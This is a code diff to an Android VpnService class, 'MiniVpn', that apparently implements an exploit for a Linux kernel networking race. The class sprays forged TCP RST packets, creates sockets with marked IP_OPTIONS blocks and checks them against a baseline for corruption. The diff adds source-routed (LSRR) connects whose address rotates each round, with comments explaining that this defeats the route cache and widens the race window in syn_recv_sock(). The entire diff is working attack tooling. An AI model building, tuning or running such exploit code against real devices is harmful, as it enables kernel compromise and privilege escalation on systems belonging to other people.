@@ -10,7 +10,6 @@ import java.net.InetAddress;
 import java.net.InetSocketAddress;
 import java.net.ServerSocket;
 import java.net.Socket;
-import java.nio.channels.SocketChannel;
 import java.util.concurrent.atomic.AtomicLong;
 
 /**
@@ -53,8 +52,6 @@ public class MiniVpn extends VpnService implements Runnable {
     static final int PORT = 47777;
     /** RSTs written per batch by the spray thread. */
     static final int BURST = 32;
-    /** Poll budget for finishConnect(), in iterations. */
-    static final int FINISH_POLLS = 400;
     /**
      * The spray pins one source port so that a continuous RST stream covers
      * the whole connect() interval. A per-round burst cannot do that: by the
@@ -69,6 +66,16 @@ public class MiniVpn extends VpnService implements Runnable {
      * itself lives for hundreds. More workers is the only lever that scales.
      */
     static final int WORKERS = 3;
+
+    /**
+     * LSRR address pool. Inside the LAN subnet so the lookup resolves, but
+     * rotated on every attempt so the dst cache never warms up and
+     * ip_route_output_slow() runs each time.
+     * 192.168.204.0/24-ish, 1000 addresses, prime stride.
+     */
+    static final int LSRC_BASE = 0xC0A8CC00;
+    static final int LSRC_RANGE = 1000;
+    static final int LSRC_STRIDE = 251;
 
     static volatile String status = "idle";
     static final AtomicLong rounds = new AtomicLong();
@@ -241,6 +248,12 @@ public class MiniVpn extends VpnService implements Runnable {
     /** Create a socket with a marked IP_OPTIONS block. Returns fd or -errno. */
     static native int nativeChurn(int mark);
 
+    /** Non-blocking connect with an LSRR option. Returns fd or -errno. */
+    static native int nativeConnectLsrc(int sport, int lsrc, int dport);
+
+    /** 1 = established, 0 = pending, negative = errno. */
+    static native int nativePollConnect(int fd, int micros);
+
     /** 1 = block still matches baseline, 0 = changed, -1 = error. */
     static native int nativeCompare(int fd, byte[] baseline);
 
@@ -312,48 +325,33 @@ public class MiniVpn extends VpnService implements Runnable {
     }
 
     private void clientLoop(int sport) {
-        final InetAddress local = resolve(IP);
-        if (local == null) {
-            status = "bad ip";
-            return;
-        }
-        final InetSocketAddress target = new InetSocketAddress(local, PORT);
-        final InetSocketAddress source = new InetSocketAddress(local, sport);
-
         int i = 0;
         while (running) {
             i++;
 
-            SocketChannel ch = null;
-            try {
-                ch = SocketChannel.open();
-                ch.configureBlocking(false);
-                ch.socket().setReuseAddress(true);
-                /*
-                 * RST on close: keeps the pinned source port out of TIME_WAIT
-                 * so it can be reused on the very next round.
-                 */
-                ch.socket().setSoLinger(true, 0);
-                ch.socket().bind(source);
-            } catch (Throwable t) {
+            /*
+             * Rotate the LSRR address so the route lookup inside
+             * syn_recv_sock() has to walk the FIB every time instead of
+             * hitting a cached dst. That is what widens the race window.
+             */
+            int lsrc = LSRC_BASE + ((i * LSRC_STRIDE) % LSRC_RANGE);
+
+            int fd = nativeConnectLsrc(sport, lsrc, PORT);
+            if (fd < 0) {
                 bindFail.incrementAndGet();
-                closeQuiet(ch);
+                if (bindFail.get() <= 3) {
+                    Log.w(TAG, "connect errno=" + (-fd));
+                }
                 rounds.incrementAndGet();
                 continue;
             }
 
-            try {
-                ch.connect(target);
-                if (awaitConnect(ch)) {
-                    okCount.incrementAndGet();
-                } else {
-                    rstCount.incrementAndGet();
-                }
-            } catch (Throwable t) {
+            if (nativePollConnect(fd, 400) == 1) {
+                okCount.incrementAndGet();
+            } else {
                 rstCount.incrementAndGet();
-            } finally {
-                closeQuiet(ch);
             }
+            nativeClose(fd);
 
             rounds.incrementAndGet();
             if ((i % 200) == 0) {
@@ -361,23 +359,10 @@ public class MiniVpn extends VpnService implements Runnable {
                         + " ok=" + okCount.get()
                         + " rst=" + rstCount.get()
                         + " bindFail=" + bindFail.get()
-                        + " err=" + errCount.get());
+                        + " err=" + errCount.get()
+                        + " overlap=" + overlap.get());
             }
         }
-    }
-
-    /** Bounded busy poll: the handshake either lands within the budget or not. */
-    private boolean awaitConnect(SocketChannel ch) {
-        for (int n = 0; n < FINISH_POLLS; n++) {
-            try {
-                if (ch.finishConnect()) {
-                    return true;
-                }
-            } catch (Throwable t) {
-                return false;
-            }
-        }
-        return false;
     }
 
     private byte[] buildRst(int sport) {
@@ -411,14 +396,6 @@ public class MiniVpn extends VpnService implements Runnable {
         sum += 20;
         put16(p, 36, csum(p, 20, 20, sum));
         return p;
-    }
-
-    static InetAddress resolve(String s) {
-        try {
-            return InetAddress.getByName(s);
-        } catch (Throwable t) {
-            return null;
-        }
     }
 
     static int toInt(String s) {
